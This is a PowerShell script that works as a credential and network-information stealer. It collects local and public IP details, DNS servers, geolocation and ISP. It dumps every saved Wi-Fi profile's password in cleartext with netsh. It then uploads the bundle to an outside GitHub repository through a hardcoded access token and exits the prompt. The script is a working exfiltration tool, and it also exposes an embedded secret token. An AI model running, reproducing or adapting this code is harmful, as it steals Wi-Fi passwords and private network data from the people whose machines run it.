# Get IP address information
$ipAddress = Get-NetIPAddress | Select-Object -Property IPAddress, InterfaceAlias, AddressFamily

# Get DNS server addresses
$dnsServers = Get-DnsClientServerAddress | Select-Object -Property InterfaceAlias, ServerAddresses

# Get public IPv4 address and geo information
$publicIpInfo = Invoke-RestMethod -Uri "http://ipinfo.io/json"
$publicIpAddress = $publicIpInfo.ip
$geoInfo = "City: $($publicIpInfo.city), Region: $($publicIpInfo.region), Country: $($publicIpInfo.country)"

# Get ISP information
$isp = $publicIpInfo.org

# Get Wi-Fi SSID and password (requires running as administrator)
$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
$wifiInfo = foreach ($profile in $wifiProfiles) {
    $ssid = $profile
    $password = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
    [PSCustomObject]@{
        SSID = $ssid
        Password = $password
    }
}

# Get the username of the logged-in user
$username = (Get-WmiObject -Class Win32_ComputerSystem).UserName.Split('\')[-1]

# Define GitHub access token, repository, and file path
$githubAccessToken = "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"
$repoOwner = "HaxKiana"
$repoName = "yourmom"
$filePath = "$username-network-info.txt"
$branch = "main"

# Combine all information into a single string
$networkInfo = @"
Network Adapter Information:
$($ipAddress | Format-Table -AutoSize | Out-String)

IP Address Information:
$($ipAddress | Format-Table -AutoSize | Out-String)

DNS Server Addresses:
$($dnsServers | Format-Table -AutoSize | Out-String)

Public IPv4 Address:
$publicIpAddress

Geo Information:
$geoInfo

ISP Information:
$isp

Wi-Fi Information:
$($wifiInfo | Format-Table -AutoSize | Out-String)
"@

# Convert the network information to base64
$networkInfoBase64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($networkInfo))

# Get the SHA of the existing file (if it exists)
$existingFileUrl = "https://api.github.com/repos/$repoOwner/$repoName/contents/$filePath"
$headers = @{
    "Authorization" = "token $githubAccessToken"
    "Content-Type" = "application/json"
    "User-Agent" = "PowerShell"
}
$response = Invoke-RestMethod -Uri $existingFileUrl -Method Get -Headers $headers -ErrorAction SilentlyContinue
$fileSha = if ($response) { $response.sha } else { $null }

# Create the JSON payload for the commit
$commitPayload = @{
    message = "Update $filePath"
    content = $networkInfoBase64
    branch = $branch
    sha = $fileSha
} | ConvertTo-Json

# Upload the file to the GitHub repository
Invoke-RestMethod -Uri $existingFileUrl -Method Put -Headers $headers -Body $commitPayload

# Close the PowerShell prompt
exit